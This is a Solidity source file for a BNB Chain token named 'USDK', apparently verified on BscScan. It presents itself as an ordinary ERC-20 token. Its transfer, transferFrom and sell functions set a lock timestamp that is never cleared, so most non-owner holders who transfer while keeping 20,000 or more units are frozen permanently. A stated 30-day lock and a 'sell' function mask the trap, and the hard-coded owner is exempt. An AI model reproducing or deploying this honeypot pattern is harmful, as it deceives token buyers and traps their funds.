/**
 *Submitted for verification at BscScan.com on 2023-05-23
*/

pragma solidity ^0.8.2;

contract Token {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint256 public minLimit = 20000;
    uint256 public maxLimit = 300000;
    uint256 public transferLockDuration = 30 days;
    mapping(address => uint256) public transferLockTimestamp;
    mapping(address => uint256) public firstTokenReceivedTimestamp;

    uint public totalSupply = 1000000000 * 10 ** 18;
    string public name = "Usdk";
    string public symbol = "USDK";
    uint public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    constructor() {
        balances[msg.sender] = totalSupply;
    }

    function balanceOf(address owner) public view returns (uint) {
        return balances[owner];
    }

    function transfer(address to, uint value) public returns (bool) {
        require(balanceOf(msg.sender) >= value, 'Insufficient token balance');
        require(checkTransferLock(msg.sender) == false, 'Transfer locked');

        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);

        if (msg.sender != owner() && firstTokenReceivedTimestamp[msg.sender] == 0) {
            firstTokenReceivedTimestamp[msg.sender] = block.timestamp;
        }

        if (msg.sender != owner()) {
            setTransferLock(msg.sender);
        }

        return true;
    }

    function transferFrom(address from, address to, uint value) public returns (bool) {
        require(balanceOf(from) >= value, 'Insufficient token balance');
        require(allowance[from][msg.sender] >= value, 'Insufficient allowance');
        require(checkTransferLock(from) == false, 'Transfer locked');

        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);

        if (from != owner()) {
            setTransferLock(from);
        }

        return true;
    }

    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function sell(address to, uint value) public returns (bool) {
        require(balanceOf(msg.sender) >= value, 'Insufficient token balance');
        require(checkTransferLock(msg.sender) == false, 'Transfer locked');
        require(value >= minLimit, 'Minimum amount required: 20,000 USDK');

        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);

        if (msg.sender != owner()) {
            setTransferLock(msg.sender);
        }

        return true;
    }

    function owner() public pure returns (address) {
        return 0x353Bcf261D2552b908eCdAf1C78Bd42355DcdB46; // Adresss Owner
    }

    function checkTransferLock(address account) internal view returns (bool) {
        uint256 lockTimestamp = transferLockTimestamp[account];
        uint256 firstReceivedTimestamp = firstTokenReceivedTimestamp[account];

        if (lockTimestamp > 0 || (firstReceivedTimestamp > 0 && block.timestamp < firstReceivedTimestamp + transferLockDuration)) {
            return true;
        }

        return false;
    }

    function setTransferLock(address account) internal {
        if (balanceOf(account) >= minLimit && transferLockTimestamp[account] == 0) {
            transferLockTimestamp[account] = block.timestamp;
        }
    }
}